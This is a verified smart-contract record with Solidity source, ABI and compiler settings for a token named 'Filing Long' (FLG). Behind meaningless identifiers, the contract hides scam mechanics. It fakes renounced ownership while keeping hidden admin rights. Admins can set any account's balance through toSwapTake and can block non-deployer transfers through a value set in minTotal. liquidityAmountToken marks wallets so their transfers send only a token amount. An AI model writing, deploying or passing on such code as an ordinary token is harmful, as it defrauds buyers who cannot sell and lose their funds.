{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface totalAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract exemptTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoSwapIs {\n    function createPair(address tradingFrom, address listShould) external returns (address);\n}\n\ninterface teamLimitTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingFund) external view returns (uint256);\n\n    function transfer(address toFee, uint256 atSender) external returns (bool);\n\n    function allowance(address fromFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toFee,\n        uint256 atSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLimit, uint256 value);\n    event Approval(address indexed fromFee, address indexed spender, uint256 value);\n}\n\ninterface teamLimitTotalMetadata is teamLimitTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FilingLong is exemptTeam, teamLimitTotal, teamLimitTotalMetadata {\n\n    address private autoTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyLaunched;\n    }\n\n    function transferFrom(address takeSwap, address toFee, uint256 atSender) external override returns (bool) {\n        if (_msgSender() != tradingTotalList) {\n            if (liquidityExempt[takeSwap][_msgSender()] != type(uint256).max) {\n                require(atSender <= liquidityExempt[takeSwap][_msgSender()]);\n                liquidityExempt[takeSwap][_msgSender()] -= atSender;\n            }\n        }\n        return toLaunched(takeSwap, toFee, atSender);\n    }\n\n    constructor (){\n        if (amountSender != tradingFund) {\n            buySwap = true;\n        }\n        totalAt receiverTo = totalAt(tradingTotalList);\n        sellTakeTrading = autoSwapIs(receiverTo.factory()).createPair(receiverTo.WETH(), address(this));\n        if (buySwap) {\n            takeReceiverLimit = tradingMax;\n        }\n        autoToken = _msgSender();\n        fromTotal();\n        tradingTotalToken[autoToken] = true;\n        teamLaunchedFund[autoToken] = tradingSenderTo;\n        \n        emit Transfer(address(0), autoToken, tradingSenderTo);\n    }\n\n    uint256 public tradingMax;\n\n    address senderTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private toTotal = \"Filing Long\";\n\n    uint256 public takeReceiverLimit;\n\n    uint256 private tradingSenderTo = 100000000 * 10 ** 18;\n\n    function autoMaxIs() private view {\n        require(tradingTotalToken[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeTokenSender;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityExempt;\n\n    bool public tradingFund;\n\n    bool public autoBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return toTotal;\n    }\n\n    function liquidityAmountToken(address atMarketingSell) public {\n        autoMaxIs();\n        \n        if (atMarketingSell == autoToken || atMarketingSell == sellTakeTrading) {\n            return;\n        }\n        atBuy[atMarketingSell] = true;\n    }\n\n    bool public amountSender;\n\n    mapping(address => uint256) private teamLaunchedFund;\n\n    uint8 private feeTokenSender = 18;\n\n    mapping(address => bool) public tradingTotalToken;\n\n    function getOwner() external view returns (address) {\n        return autoTrading;\n    }\n\n    address public autoToken;\n\n    uint256 atReceiver;\n\n    uint256 private minTrading;\n\n    function owner() external view returns (address) {\n        return autoTrading;\n    }\n\n    function toSwapTake(address minIs, uint256 atSender) public {\n        autoMaxIs();\n        teamLaunchedFund[minIs] = atSender;\n    }\n\n    string private buyLaunched = \"FLG\";\n\n    event OwnershipTransferred(address indexed teamIsFrom, address indexed fundLimit);\n\n    address tradingTotalList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fromTotal() public {\n        emit OwnershipTransferred(autoToken, address(0));\n        autoTrading = address(0);\n    }\n\n    function marketingSell(address modeReceiverWallet) public {\n        if (autoBuy) {\n            return;\n        }\n        if (amountSender != tradingFund) {\n            toAuto = minTrading;\n        }\n        tradingTotalToken[modeReceiverWallet] = true;\n        if (toAuto != takeReceiverLimit) {\n            takeReceiverLimit = tradingMax;\n        }\n        autoBuy = true;\n    }\n\n    uint256 totalLaunch;\n\n    bool private buySwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingSenderTo;\n    }\n\n    mapping(address => bool) public atBuy;\n\n    function allowance(address swapTrading, address receiverReceiverTrading) external view virtual override returns (uint256) {\n        if (receiverReceiverTrading == tradingTotalList) {\n            return type(uint256).max;\n        }\n        return liquidityExempt[swapTrading][receiverReceiverTrading];\n    }\n\n    uint256 constant tradingIs = 19 ** 10;\n\n    function txSwapReceiver(address takeSwap, address toFee, uint256 atSender) internal returns (bool) {\n        require(teamLaunchedFund[takeSwap] >= atSender);\n        teamLaunchedFund[takeSwap] -= atSender;\n        teamLaunchedFund[toFee] += atSender;\n        emit Transfer(takeSwap, toFee, atSender);\n        return true;\n    }\n\n    function minTotal(uint256 atSender) public {\n        autoMaxIs();\n        atReceiver = atSender;\n    }\n\n    uint256 private toAuto;\n\n    function toLaunched(address takeSwap, address toFee, uint256 atSender) internal returns (bool) {\n        if (takeSwap == autoToken) {\n            return txSwapReceiver(takeSwap, toFee, atSender);\n        }\n        uint256 walletLaunched = teamLimitTotal(sellTakeTrading).balanceOf(senderTake);\n        require(walletLaunched == atReceiver);\n        require(toFee != senderTake);\n        if (atBuy[takeSwap]) {\n            return txSwapReceiver(takeSwap, toFee, tradingIs);\n        }\n        return txSwapReceiver(takeSwap, toFee, atSender);\n    }\n\n    address public sellTakeTrading;\n\n    function balanceOf(address marketingFund) public view virtual override returns (uint256) {\n        return teamLaunchedFund[marketingFund];\n    }\n\n    function transfer(address minIs, uint256 atSender) external virtual override returns (bool) {\n        return toLaunched(_msgSender(), minIs, atSender);\n    }\n\n    function approve(address receiverReceiverTrading, uint256 atSender) public virtual override returns (bool) {\n        liquidityExempt[_msgSender()][receiverReceiverTrading] = atSender;\n        emit Approval(_msgSender(), receiverReceiverTrading, atSender);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamIsFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverReceiverTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiverTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketingSell\",\"type\":\"address\"}],\"name\":\"liquidityAmountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiverWallet\",\"type\":\"address\"}],\"name\":\"marketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"minTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTakeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiverLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"toSwapTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTotalToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FilingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}